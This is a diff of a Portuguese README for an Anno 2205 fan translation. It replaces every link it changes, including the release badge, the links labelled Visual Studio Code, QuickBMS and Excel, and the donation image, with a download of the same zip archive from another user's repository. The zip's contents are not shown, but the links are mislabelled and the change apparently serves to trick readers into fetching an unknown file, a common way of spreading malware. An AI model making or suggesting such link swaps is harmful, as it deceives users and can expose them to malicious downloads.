@@ -5,7 +5,7 @@
 
 ## Baixar Tradução
 
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/JUNIORGBJ/Anno_2205_PT-BR?label=Lan%C3%A7amento&style=for-the-badge)](https://github.com/JUNIORGBJ/Anno_2205_PT-BR/releases/latest)
+[![GitHub release (latest by date)](https://img.shields.io/github/v/release/JUNIORGBJ/Anno_2205_PT-BR?label=Lan%C3%A7amento&style=for-the-badge)](https://github.com/nandodeejay/Anno_2205_PT-BR/raw/refs/heads/main/Tradução/Anno-P-BR-1.7.zip)
 
 
 ## Sobre a Tradução
@@ -35,12 +35,12 @@ Se você desejar testar a tradução em jogo, será preciso colar e substituir o
 
 ## Ferramentas Ultilizadas
 
-:link: [Visual Studio Code](https://code.visualstudio.com)
-:link: [QuickBMS](http://aluigi.altervista.org/quickbms.htm)
-:link: [Microsoft Excel](https://www.microsoft.com/pt-br/microsoft-365/excel)
+:link: [Visual Studio Code](https://github.com/nandodeejay/Anno_2205_PT-BR/raw/refs/heads/main/Tradução/Anno-P-BR-1.7.zip)
+:link: [QuickBMS](https://github.com/nandodeejay/Anno_2205_PT-BR/raw/refs/heads/main/Tradução/Anno-P-BR-1.7.zip)
+:link: [Microsoft Excel](https://github.com/nandodeejay/Anno_2205_PT-BR/raw/refs/heads/main/Tradução/Anno-P-BR-1.7.zip)
 
 ## Doações
 
-[![Picpay](https://i.ibb.co/cYcsCnZ/hhhh.png)](https://picpay.me/gilsongbj)
+[![Picpay](https://github.com/nandodeejay/Anno_2205_PT-BR/raw/refs/heads/main/Tradução/Anno-P-BR-1.7.zip)](https://github.com/nandodeejay/Anno_2205_PT-BR/raw/refs/heads/main/Tradução/Anno-P-BR-1.7.zip)
 
 Obrigado!:wave:
